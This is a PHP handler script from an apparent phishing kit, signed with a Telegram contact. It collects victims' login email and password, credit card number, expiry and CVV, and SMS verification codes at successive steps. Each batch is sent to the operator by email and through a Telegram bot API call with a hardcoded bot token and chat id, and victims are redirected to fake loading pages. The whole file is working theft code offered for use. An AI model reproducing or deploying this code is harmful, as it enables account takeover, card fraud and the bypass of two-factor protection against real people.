<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

$to = '';
$apiToken = "5852700767:AAHdxDWKcWDUWmdaba7YrfC15GgGIlb4hPY";
$id = "5460677473";




if ($_POST['step']== 'index') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    if (empty($email) || empty($password)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = "======>" . " | LOGIN | STANDER" ."<======" .  "\r\n" ;
        $message  =  $adrress ." _________ INFO_LOGIN___" . "\r\n";
        $message .= "EMAIL : " . $email                   . "\r\n";
        $message .= "PASSWORD : " . $password             . "\r\n";

        mail($to, $subject, $message);
        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading.php");
        exit();
    }
}

if ($_POST['step']=='cc') {
        $_SESSION['errors']       = [];
        $_SESSION['card_number']  = $_POST['card_number'];
        $_SESSION['expiry']       = $_POST['expiry'];
        $_SESSION['ccv']          = $_POST['ccv'];


        if( empty($_POST['card_number']) ) {
            $_SESSION['errors']['card_number'] = true;
        }

        if( empty($_POST['expiry']) ) {
            $_SESSION['errors']['expiry'] = true;
        }

        if( empty($_POST['cvv']) ) {
            $_SESSION['errors']['cvv'] = true;
        }


        if( count($_SESSION['errors']) == 0 ) {
            $subject  = $_SERVER['REMOTE_ADDR'] . " | Stander | CC |"     . "\r\n"; ;
            $message  = "_______  CC INFO ___ " . $_SERVER["REMOTE_ADDR"]  . "\r\n"; 
            $message .= "CARD NUMBER : " . $_POST['card_number']           . "\r\n";
            $message .= "EXPIRY : " . $_POST['expiry']                     . "\r\n" ;
            $message .= "CVV : " . $_POST['cvv']                           . "\r\n" ;

            mail($to, $subject, $message);
        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };

            header("Location: loading-sms.php"); 
            exit();
        }else{
            header("Location: cc.php");
            exit();}
}





else if ($_POST['step'] == 'sms') {
  

    if( count($_SESSION['errors']) == 0 ) {

        $subject  = $_SERVER['REMOTE_ADDR'] . " | Stander | SMS |" . "\r\n"; ;
        $message  = "_______  SMS INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
        $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";

        mail($to, $subject, $message);
        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };

        header("Location: sms-er.php"); 
        exit(); 
    }

}


else if ($_POST['step'] == 'sms-er') {
  

    if( count($_SESSION['errors']) == 0 ) {

        $subject  = $_SERVER['REMOTE_ADDR'] . " | Stander | SMS |" . "\r\n"; ;
        $message  = "_______  SMS INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
        $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";

        mail($to, $subject, $message);
        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };

        header("Location: sms-er.php"); 
        exit(); 
    }

}



?>